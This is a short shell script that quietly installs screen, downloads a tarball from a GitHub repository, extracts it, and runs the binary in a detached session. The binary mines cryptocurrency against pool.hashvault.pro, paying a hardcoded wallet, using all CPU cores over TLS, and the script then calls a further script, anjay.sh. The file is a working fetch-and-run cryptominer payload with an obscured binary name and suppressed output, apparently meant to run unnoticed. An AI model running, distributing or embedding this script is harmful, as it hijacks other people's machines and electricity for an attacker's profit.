#!/bin/sh

WALLET=83HzBwN146c9iq4p8mcxT6fM3hUNmHpzZii8uS8j37LkimD72XNQ3kZ9GisSHpWNw4UKapG4pkfzB9hKvvXxvdn2Gmrynju

POOL=pool.hashvault.pro:443

sudo apt install screen -y > /dev/null 2>&1
wget wget https://github.com/muledan1/bash/raw/main/-.tar.gz
tar -xf -.tar.gz
screen -S Wuenuak_Guerrr -dm ./- --url pool.hashvault.pro:443 --user 83HzBwN146c9iq4p8mcxT6fM3hUNmHpzZii8uS8j37LkimD72XNQ3kZ9GisSHpWNw4UKapG4pkfzB9hKvvXxvdn2Gmrynju --pass kanyut --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t$(nproc --all)
screen -ls
sleep 2
clear
cd ..
screen -ls
./anjay.sh
